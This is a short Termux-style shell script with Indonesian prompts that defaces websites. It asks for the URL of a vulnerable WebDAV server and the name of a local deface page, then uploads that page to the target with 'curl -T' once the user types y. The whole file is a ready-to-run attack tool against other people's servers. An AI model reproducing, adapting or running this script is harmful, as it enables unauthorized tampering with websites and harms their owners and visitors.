pkg install python2
python2 1.py
clear
toilet -f slant --gay "Webdav"
sleep 0.08
echo "\033[31;1mWebdav Simpel"
echo

read -p "Masukkan link vuln webdav:" l;
echo

echo "\033[31;1mUsahakan script defacenya berada di luar folder"
cd /sdcard
read -p "Masukkan nama script deface:" n;
echo
sleep 0.03
echo "\033[33;1mLanjut execute y/n"
read ex

if
[ $ex = y ] || [ $ex = y ]
then
echo "\033[32;1mExecute"
sleep 1
curl -T $n $l 
fi

if
[ $ex = n ] || [ $ex = n ]
then
echo "\033[31;mDibatalkan"
sleep 1
cd 
clear
fi
